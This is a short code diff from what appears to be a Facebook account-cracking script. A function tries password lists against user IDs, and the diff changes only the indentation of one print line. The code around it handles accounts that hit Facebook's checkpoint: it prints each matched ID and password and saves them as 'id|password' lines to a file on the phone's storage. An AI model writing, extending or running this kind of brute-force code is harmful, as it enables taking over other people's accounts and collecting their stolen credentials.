@@ -412,7 +412,7 @@ def ffb(ids,names,passlist):
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                        	    print('\r\r\x1b[1;49;93m [YUJI-CP] '+ids+'\033[1;37m | \033[1;33m'+pas+ ' '+joined(ids)+' ')
+                                                print('\r\r\x1b[1;49;93m [YUJI-CP] '+ids+'\033[1;37m | \033[1;33m'+pas+ ' '+joined(ids)+' ')
                                                 open('/sdcard/YUJI-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 ids2.append(ids)
                                                 break
